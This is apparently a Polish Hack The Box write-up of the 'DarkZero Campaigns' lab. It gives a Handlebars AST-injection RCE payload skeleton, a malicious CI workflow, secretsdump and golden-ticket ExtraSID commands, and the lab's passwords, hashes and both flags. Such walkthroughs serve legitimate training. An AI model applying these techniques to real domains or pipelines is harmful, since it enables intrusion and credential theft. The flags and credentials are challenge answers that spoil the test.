# DarkZero Campaigns (dzcampaigns) — HTB Write-up

**Autor:** DonMorpheus (lab) + Ania  
**Maszyna:** `dzcampaigns.htb` / DarkZero Campaigns (tournament HARD)  
**OS:** Ubuntu 24.04 guest (**SRV01**) + dual AD forests Windows Server 2025  
**VPN:** Release Arena EU  

> Flagi i hasła na końcu. Scope: wyłącznie HTB / własny lab.

---

## TL;DR

| Faza | Wektor |
|------|--------|
| Recon | `dzcampaigns.htb` → Express + **Handlebars 4.7.8** |
| Foothold | **CVE-2026-33937** — `campaign_message` jako AST object (`NumberLiteral.value`) → RCE jako `darkzero` |
| Domain ID | Web hash **josh** = AD `Rangers1` → `kinit` EXT |
| User shell | Gitea **SPNEGO** + PR / review-comment workflow `runs-on: ubuntu` → **svc-runner** SSH |
| User flag | `~/user.txt` na SRV01 |
| Root SRV01 | svc-runner writable **OU=GiteaMigration** → AD user `root` → `kinit` + **`ksu root`** (brak `root.txt` na Linuxie) |
| DA EXT | `celia` / `babygurl13` → secretsdump DC02 |
| System HTB | Golden EXT + **ExtraSID `S-1-5-32-551` (Backup Operators)** → CIFS DC01 + `FILE_OPEN_FOR_BACKUP_INTENT` → `root.txt` |

---

## Topology

```
Kali (tun0 HTB)
    │
    │  10.129.x.x  (Release Arena)
    ▼
┌──────────────────────────────────────────────┐
│  SRV01  Ubuntu 24.04   172.16.20.3           │
│  - nginx :80 → Node campaigns                │
│  - SSH, act_runner (label ubuntu)            │
│  domain-joined DARKZERO.EXT                  │
└────────────┬─────────────────────────────────┘
             │
     ┌───────┴────────┐
     ▼                ▼
 DC02 EXT          DC01 HTB
 172.16.20.2       172.16.20.1
 DARKZERO.EXT      DARKZERO.HTB
 Gitea :3000       CA / AD DC
 forest trust ↔ (bi-dir)
 HTB→EXT trustAttributes = 72
   (FOREST_TRANSITIVE | TREAT_AS_EXTERNAL)
 EXT→HTB trustAttributes = 8
   (FOREST_TRANSITIVE only)
```

Pivot do AD: **SOCKS** (np. chisel reverse z SRV01 → Kali `127.0.0.1:1080`).

---

## 1. Recon

```bash
# VPN: release_arena, NIE machines
openvpn --config ~/Desktop/release_arena_eu-release-1.ovpn ...

echo '10.129.x.x dzcampaigns.htb' | sudo tee -a /etc/hosts
nmap -sC -sV -oA nmap/initial 10.129.x.x
```

- **22** OpenSSH (Ubuntu)  
- **80** nginx → Node/Express (cookie `dz.sid`)  
- Wewnętrznie po shellu: `172.16.20.1` (DC01 HTB), `.2` (DC02 EXT + Gitea), `.3` (SRV01)

Aplikacja: **DarkZero Campaigns** (D&D campaign board). Stack: Express + **Handlebars 4.7.8**.

---

## 2. Foothold — Handlebars AST RCE (CVE-2026-33937)

### Bait vs real path

- String SSTI typu `{{7*7}}` / `{{#each}}` → **400** (filtr).  
- `{{name}}` jest „bezpieczną” substytucją.  
- **Intended:** `campaign_message` jako **JSON object (AST)**, nie string.

W Handlebars 4.7.8, gdy `NumberLiteral.value` jest stringiem ze złośliwym JS, compile path może doprowadzić do RCE (details: CVE-2026-33937 / Handlebars AST injection).

### Exploit (skrót)

`POST /character` z JSON:

```json
"campaign_message": {
  "type": "Program",
  "body": [{
    "type": "MustacheStatement",
    "path": { "type": "PathExpression", "parts": ["lookup"], "original": "lookup" },
    "params": [
      { "type": "PathExpression", "parts": [], "original": "this" },
      { "type": "NumberLiteral", "value": "PAYLOAD_JS", "original": 1 }
    ],
    "escaped": true
  }]
}
```

Payload (idea): break out + `process.mainModule.require('child_process').execSync(...)`.

Praktycznie: zapis outputu do pliku w app dir (np. `/opt/DarkZero_Campaigns/rlast.txt`) i odczyt drugą komendą / base64 — bo HTTP response bywa obcięty.

```bash
# po zalogowaniu (cookie jar)
python3 scripts/ast_rce.py 'id; cat /etc/hostname'
```

RCE leci jako user **`darkzero`** (systemd, **NoNewPrivs** — klasyczny privesc z Node nie jest intended).

### Loot z RCE

- `.env` (DB lokalne, session secret) — **nie** domena.  
- Josh hash w MySQL web ≠ AD na starcie (web można nadpisać bez zmiany AD).  
- Docelowo: hasło web **`Rangers1`** = hash oryginalnego **josh** = ten sam w **AD EXT**.

---

## 3. Domain identity — josh

```bash
# z Kali / SRV (clock sync!)
kinit josh@DARKZERO.EXT   # Rangers1
# or SSH: josh@box z tym samym hasłem (gdy otwarte)
```

**ldapwhoami / SPN:** Gitea `HTTP/gitea.darkzero.ext`.

### Gitea — SPNEGO, nie password login

```bash
# Host header + negotiate
export KRB5CCNAME=...
curl --negotiate -u : -H 'Host: gitea.darkzero.ext' http://gitea.darkzero.ext:3000/
# user API: darkzero-ext_josh
```

LDAP quirks: `SASL_NOCANON on`, FQDN URI; clock skew Kali↔DC psuje Kerberos (sync z SRV/DC).

---

## 4. User — Gitea Actions → svc-runner

Oficjalny runner: label **`ubuntu`** / host runner w domenie (`ubuntu-domain-runner`), nie dummy `self-hosted` własnego konta.

**Ścieżka:**

1. Fork / clone repo `DarkZero/DarkZero-Campaigns` (jako `darkzero-ext_josh`).  
2. Workflow z `on: pull_request_review_comment` (lub pokrewne) i `runs-on: ubuntu`.  
3. Job jako **svc-runner** (keytab / machine identity runnera).  
4. W jobie: dopisać klucz do `~/.ssh/authorized_keys` svc-runner **albo** odczytać sekrety / user flag.

```bash
ssh -i ~/.ssh/dz_svc svc-runner@10.129.x.x
cat ~/user.txt
# c7bdc928e2323c1431ab6f256138dfe9
```

svc-runner: memberOf **ServiceHandler**, keytab `/etc/gitea-runner/svc-runner.keytab`, UAC don’t-expire.

---

## 5. Root na SRV01 — ksu + AD user `root`

**Brak `root.txt` na Linuxie** — root na SRV01 służy do dumpów / laterali AD.

svc-runner ma **write** na **`OU=GiteaMigration`** (EXT):

1. Utwórz user `root` (disabled).  
2. Ustaw `unicodePwd` (UTF-16-LE quoted).  
3. Enable `userAccountControl=512`.  
4. `kinit root@DARKZERO.EXT` + **`ksu root`**.

```bash
echo 'Rangers1!Abc' | kinit -c FILE:/tmp/root.ccache root@DARKZERO.EXT
KRB5CCNAME=FILE:/tmp/root.ccache ksu root -n root@DARKZERO.EXT -c FILE:/tmp/root.ccache
# interactive shell uid=0
# loot: /root/darkzero_campaigns_backup.sql
```

`ksu -e multi-arg` bywa kapryśne (`command did not get resolved`) — interactive OK.

---

## 6. DA EXT — celia

Z app backup SQL / enum / LSA (po DA) pojawia się m.in.:

| Konto | Hasło / hash | Rola |
|-------|----------------|------|
| celia@DARKZERO.EXT | **babygurl13** | **Domain Admin EXT** |
| svc-gitea | SMvUAmVFTY7! | Gitea service (LSA) |
| Administrator (local DC02) | NT `6a2bdd03…` | Local admin DC02 |
| josh | Rangers1 | Domain user |

```bash
proxychains nxc smb 172.16.20.2 -u celia -p 'babygurl13' -d darkzero.ext
proxychains secretsdump.py 'darkzero.ext/celia:babygurl13@172.16.20.2'
```

**krbtgt EXT** (przykład z lab dump): NT / AES w `loot/ntds-ext-full.txt`.

Domain SID EXT: `S-1-5-21-2850783758-1231244658-2051857529`  
Domain SID HTB: `S-1-5-21-2899195410-1848524783-1547768515`

### HTB side (enum as celia cross-trust)

- Użytkownicy: Administrator, Guest, krbtgt, **ella**  
- **Backup Operators** ← member **InfrastructureAdministrators** (pusta grupa, adminCount=1)  
- trust na HTB do EXT: **trustAttributes 72** (treat-as-external + forest)

celia **nie** ma write do membership BO na HTB; DCSync HTB jako EXT DA nie przechodzi.

---

## 7. System — ExtraSID Backup Operators

### Intuicja

Na HTB:

```
CN=Backup Operators,CN=Builtin
  member: CN=InfrastructureAdministrators,...
```

InfraAdmins pusta → trzeba **effective BO** innym sposobem.

Forest trust HTB←EXT ma **TREAT_AS_EXTERNAL** → agresywne **SID filtering**.  
Typowe ExtraSID (Enterprise Admins HTB `…-519`) są **wycięte**.

**Well-known `S-1-5-32-551` (Backup Operators)** w PAC ExtraSIDs **przechodzi** (w tym labie) i daje SeBackupPrivilege-effective rights przy plikach z `FILE_OPEN_FOR_BACKUP_INTENT`.

### Kroki

1. Złoty ticket EXT (AES krbtgt EXT), user np. `celia`, RID 1109, grupy DA/EA EXT.  
2. **ExtraSID:** `S-1-5-32-551` (opcjonalnie `…-1603` InfraAdmins — i tak filtrowane).  
3. Z hosta z dobrym zegarem/DNS (SRV01): MIT `kvno cifs/dc01.darkzero.htb@DARKZERO.HTB` → ST w ccache.  
4. Impacket SMB Kerberos: open plików z **backup intent**.

```bash
# forge (Kali, clock ≈ DC)
python3 scripts/forge_bo_extrasid.py \
  --krbtgt-aes <AES256_KRBTGT_EXT> \
  --domain darkzero.ext \
  --domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
  --user celia --user-id 1109 \
  --out /tmp/celia_bo.ccache

# na SRV01: KRB5 conf rdns=false + realms HTB/EXT
export KRB5CCNAME=FILE:/tmp/celia_bo.ccache
kvno cifs/dc01.darkzero.htb@DARKZERO.HTB

# odczyt root flag z backup intent
python3 scripts/smb_bo_get.py \
  --dc-ip 172.16.20.1 \
  --target dc01.darkzero.htb \
  --domain darkzero.ext --user celia \
  --path 'Users\\Administrator\\Desktop\\root.txt' \
  --out root.txt
```

### Uwagi praktyczne

- **Zegar:** skew psuje kinit/getTGT; synchronizuj z SRV01/DC.  
- Impacket cross-realm `getST` czasem `KDC_ERR_WRONG_REALM` — **MIT kvno** na SRV01 jest stabilniejsze.  
- OpenSSL/pyOpenSSL na SRV01 bywa zepsuty → stub `OpenSSL` lub bindle impacket + PATH.  
- Proxy: `proxychains` z **socks5 127.0.0.1:1080** (chisel), nie tor.  
- Unconstrained / coerce DC01→DC02 daje sesję `DC01$`, ale **TGT machine** nie zawsze leci (Server 2025 / brak KRB-CRED) — BO ExtraSID był krótszą system path.

---

## 8. Dead ends (skrót)

| Próba | Wynik |
|-------|--------|
| Masowy password spray | lockout josh/svc-* |
| ExtraSID EA/DA HTB | filter (treat-as-external) |
| SID history / golden wrong realm | KDC_ERR_WRONG_REALM / BAD_INTEGRITY |
| Printerbug + unconstrained bez AES key | keytype 18 vs 23; po AES: „Delegate info not set” |
| DCSync HTB jako celia | brak praw |
| root.txt na SRV01 | **nie istnieje** |

---

## 9. Flagi i access

### User

```
c7bdc928e2323c1431ab6f256138dfe9
```

```bash
ssh -i ~/.ssh/dz_svc svc-runner@<IP>
```

### System

```
a8bc729d79df8ea999fad2a1471cacb7
```

`C:\Users\Administrator\Desktop\root.txt` (DC01).

### Szybkie creds

| Co | Wartość |
|----|---------|
| josh AD/web | Rangers1 |
| celia DA EXT | babygurl13 |
| AD root (ksu) | Rangers1!Abc |
| svc-gitea | SMvUAmVFTY7! |
| DC02 local Admin NT | 6a2bdd03aa4dc9ff2c4f19860e380618 |

Pełny dump: `loot/copy-paste.txt`, `loot/ntds-ext-full.txt` (lokalnie; nie commituj wrażliwych dumpów jeśli repo publiczne).

---

## 10. Skrypty w repo

| Plik | Opis |
|------|------|
| `scripts/ast_rce.py` | RCE Handlebars AST → plik / odczyt |
| `scripts/forge_bo_extrasid.py` | Golden TGT EXT + ExtraSID BO |
| `scripts/smb_bo_get.py` | CIFS Kerberos + OPEN_FOR_BACKUP_INTENT |
| `scripts/krb5-dual-realm.conf.example` | przykładowy krb5 (rdns=false) |
| `scripts/pc-chisel.conf` | proxychains → SOCKS chisel |
| `ACCESS.md` | replay |

---

## Licencja / HTB

Materiał edukacyjny — atakuj wyłącznie cele w scope HTB. Trzymaj repo **private**, jeśli nie chcesz spoilerów publicznych.
